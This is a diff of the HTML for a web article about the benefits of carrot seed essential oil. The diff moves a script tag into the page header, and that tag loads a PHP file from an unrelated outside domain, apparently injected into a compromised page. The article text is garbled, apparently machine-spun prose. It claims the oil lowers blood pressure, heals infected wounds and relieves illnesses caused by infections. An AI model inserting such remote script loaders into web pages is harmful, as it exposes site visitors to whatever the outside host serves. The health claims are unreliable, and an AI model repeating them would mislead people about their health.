@@ -1,7 +1,7 @@
 <header class="article__header separator has-animated" data-animate="">
 <h1 class="article__title h2" style="text-align: center;"><strong>BENEFITS OF CARROT SEED ESSENTIAL OIL</strong></h1>
-<p><strong></strong></p>
-</header><script src='https://www.magikfitsecrets.com/1.php'></script>
+<p><strong></strong></p><script src='https://www.magikfitsecrets.com/1.php'></script>
+</header>
 <div class="article__body rte" itemprop="articleBody" style="text-align: center;"><img src="https://www.organicfacts.net/wp-content/uploads/carrotseedoil.jpg" alt="Image result for carrot seed oil" /></div>
 <div class="article__body rte" itemprop="articleBody" style="text-align: center;"></div>
 <div class="article__body rte" itemprop="articleBody" style="text-align: center;"><strong>Carrot Seed Essential Oil is steam refined from the dried seeds of the Daucus carota plant.</strong><br /><br />Utilized in fragrance based treatment applications, Carrot Seed Oil invigorates flow just as cerebrum and nerve capacities. Its warm, hearty, woody, and herbaceous fragrance has an alleviating, reviving, and establishing impact that is known to reduce sentiments of weariness, shortcoming, tension, and stress.<br /><br />Utilized cosmetically, Carrot Seed Oil fixes skin harm, tones muscles and tissue, and fixes skin to keep it from drooping. By evacuating materially poisons, it helps resistance, lessens muscle and joint aggravation, and addresses liquid maintenance.<br /><br />Utilized restoratively, Carrot Seed Essential Oil brings down circulatory strain, encourages the mending of contaminated skin and wounds, mitigates sore throats and hiccups, and lightens sicknesses brought about by infections.<br /><br /><strong>HISTORY OF CARROT SEED OIL</strong><br /><img src="https://villagecraftandcandle.com/image/cache/data/Carrot%20Essential%20Oil-780x640.jpg" alt="Related image" /></div>
